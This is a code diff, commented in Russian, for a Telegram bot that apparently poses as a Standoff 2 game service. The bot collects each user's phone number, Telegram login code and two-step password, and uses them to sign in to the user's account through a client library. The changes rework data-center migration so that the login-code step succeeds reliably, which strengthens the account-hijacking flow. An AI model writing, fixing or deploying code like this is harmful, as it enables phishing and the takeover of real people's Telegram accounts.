@@ -17,7 +17,6 @@ const ADMIN_ID = 9068204920;
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
-// Установка Webhook
 const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL 
     ? `${process.env.RENDER_EXTERNAL_URL}/bot${BOT_TOKEN}`
     : `https://standoff2-fd3h.onrender.com/bot${BOT_TOKEN}`;
@@ -45,7 +44,7 @@ const saveDB = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2)
 const userStates = new Map();
 const activeClients = new Map();
 
-// Маппинг Data Centers (IP-адреса серверов Telegram)
+// Официальные IP-адреса Telegram Data Centers
 const DC_IPS = {
     1: '149.154.175.53',
     2: '149.154.167.51',
@@ -54,7 +53,7 @@ const DC_IPS = {
     5: '91.108.56.130'
 };
 
-// Функция создания клиента
+// Создание клиента с правильными настройками
 function createClient() {
     return new TelegramClient(new StringSession(""), apiId, apiHash, { 
         connectionRetries: 10, 
@@ -62,44 +61,49 @@ function createClient() {
         deviceModel: "Desktop",
         systemVersion: "Windows 10",
         appVersion: "1.0.0",
-        langCode: "en"
+        langCode: "en",
+        retryDelay: 1000
     });
 }
 
-// Функция отправки кода с ручной обработкой миграции
+// Отправка кода с ручной миграцией
 async function sendCodeWithMigration(phone) {
     let client = createClient();
     await client.connect();
+    console.log("✅ Подключен к DC 1");
     
-    let attempts = 0;
-    while (attempts < 5) {
-        try {
+    try {
+        const result = await client.invoke(new Api.auth.SendCode({
+            phoneNumber: phone,
+            apiId: apiId,
+            apiHash: apiHash,
+            settings: new Api.CodeSettings({})
+        }));
+        console.log("✅ Код отправлен с DC 1");
+        return { client, phoneCodeHash: result.phoneCodeHash };
+    } catch (e) {
+        if (e.errorMessage && e.errorMessage.startsWith('PHONE_MIGRATE_')) {
+            const dcId = parseInt(e.errorMessage.split('_')[2]);
+            const dcIp = DC_IPS[dcId] || '149.154.167.51';
+            console.log(`🔄 Миграция на DC ${dcId} (IP: ${dcIp})...`);
+            
+            await client.disconnect();
+            client = createClient();
+            await client.setDC(dcId, dcIp, 443);
+            await client.connect();
+            console.log(`✅ Подключен к DC ${dcId}`);
+            
             const result = await client.invoke(new Api.auth.SendCode({
                 phoneNumber: phone,
                 apiId: apiId,
                 apiHash: apiHash,
                 settings: new Api.CodeSettings({})
             }));
+            console.log("✅ Код отправлен после миграции");
             return { client, phoneCodeHash: result.phoneCodeHash };
-        } catch (e) {
-            // Если Telegram требует переезда на другой сервер
-            if (e.errorMessage && e.errorMessage.startsWith('PHONE_MIGRATE_')) {
-                const dcId = parseInt(e.errorMessage.split('_')[2]);
-                const dcIp = DC_IPS[dcId] || '149.154.167.51';
-                console.log(`🔄 Миграция на DC ${dcId} (IP: ${dcIp})...`);
-                
-                // Пересоздаем клиент с правильным DC
-                client = createClient();
-                await client.session.setDC(dcId, dcIp, 443);
-                await client.connect();
-                attempts++;
-                console.log(`⏳ Попытка ${attempts}...`);
-            } else {
-                throw e;
-            }
         }
+        throw e;
     }
-    throw new Error('Не удалось отправить код после 5 попыток миграции');
 }
 
 app.get('/api/stats', (req, res) => {
@@ -123,7 +127,6 @@ bot.on('message', async (msg) => {
     const state = userStates.get(chatId);
     if (!state) return;
 
-    // ШАГ 1: НОМЕР
     if (state.step === 'phone') {
         let phone = text.trim().replace(/[^\d]/g, '');
         if (!phone.startsWith('+')) phone = '+' + phone;
@@ -132,18 +135,16 @@ bot.on('message', async (msg) => {
         
         try {
             const { client, phoneCodeHash } = await sendCodeWithMigration(phone);
-            
             activeClients.set(chatId, { client, phoneCodeHash, phone });
             userStates.set(chatId, { step: 'code' });
             bot.sendMessage(chatId, "📩 Код отправлен! Введи код из Telegram:");
         } catch (e) {
-            console.error("Ошибка отправки кода:", e);
+            console.error("❌ Ошибка отправки кода:", e);
             bot.sendMessage(chatId, "❌ Ошибка Telegram: " + (e.errorMessage || e.message));
             userStates.delete(chatId);
         }
     }
 
-    // ШАГ 2: КОД
     if (state.step === 'code') {
         const code = text.trim();
         const sessionData = activeClients.get(chatId);
@@ -168,7 +169,6 @@ bot.on('message', async (msg) => {
         }
     }
 
-    // ШАГ 3: ПАРОЛЬ (2FA)
     if (state.step === 'password') {
         const password = text.trim();
         const sessionData = activeClients.get(chatId);
